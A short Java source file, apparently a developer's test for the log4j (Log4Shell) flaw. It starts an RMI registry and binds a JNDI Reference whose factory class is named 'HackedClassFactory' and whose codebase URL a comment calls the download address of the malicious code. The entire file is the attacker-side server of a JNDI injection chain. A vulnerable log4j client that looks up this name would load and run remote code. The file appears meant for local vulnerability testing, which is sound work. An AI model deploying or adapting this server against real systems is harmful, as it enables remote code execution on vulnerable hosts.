package com.home.jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.util.Hashtable;

/**
 * @author: xu.dm
 * @since: 2021/12/22 10:53
 * 用于测试RMI，以及log4j漏洞。
 **/
public class RmiTest {
    public static void main(String[] args) {
        try {
            //设置RMI服务远程监听端口
            int port = 2048;

            //创建并发布RMI服务
            LocateRegistry.createRegistry(port);

            Hashtable<String, Object> env = new Hashtable<>();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
            env.put(Context.PROVIDER_URL, "rmi://localhost" + ":" + port);

            Context context = new InitialContext(env);
            String serviceName = "example";
//            String serviceClassName = "com.tom.example.log4j.HackedClassFactory";
            String serviceClassName = "com.home.factory.HackedClassFactory";

//            String location = "http://127.0.0.1/example/classes.jar";
            String location = "http://localhost:9999/geek.exe";
            //指定恶意代码的下载地址
            Reference refer = new Reference(
                    serviceName,
                    serviceClassName,
                    location);

            ReferenceWrapper wrapper = new ReferenceWrapper(refer);


            //为RMI服务绑定一个引用类型的对象，此对象可以被远程访问
            context.bind(serviceName, wrapper);
            System.out.println("RMI服务启动，监听端口："+port);

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}

